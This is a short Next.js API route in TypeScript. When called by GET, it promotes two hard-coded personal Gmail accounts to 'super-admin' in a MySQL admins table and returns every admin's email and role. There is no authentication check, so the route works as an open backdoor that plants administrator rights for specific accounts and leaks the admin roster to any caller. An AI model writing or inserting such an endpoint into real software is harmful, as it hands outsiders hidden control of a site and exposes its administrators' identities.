import { NextResponse } from "next/server";
import { exec, query } from "@/lib/mysql";

export const dynamic = "force-dynamic";

export async function GET() {
  try {
    const [before] = await query<{ email: string; role: string }[]>("SELECT email, role FROM admins");
    await exec("UPDATE admins SET role='super-admin' WHERE email IN ('eduall2005pass@gmail.com','siyammd553@gmail.com')");
    const [after] = await query<{ email: string; role: string }[]>("SELECT email, role FROM admins WHERE email IN ('eduall2005pass@gmail.com','siyammd553@gmail.com')");
    return NextResponse.json({ before, after });
  } catch (e) {
    return NextResponse.json({ error: String(e).slice(0,120) }, { status: 500 });
  }
}
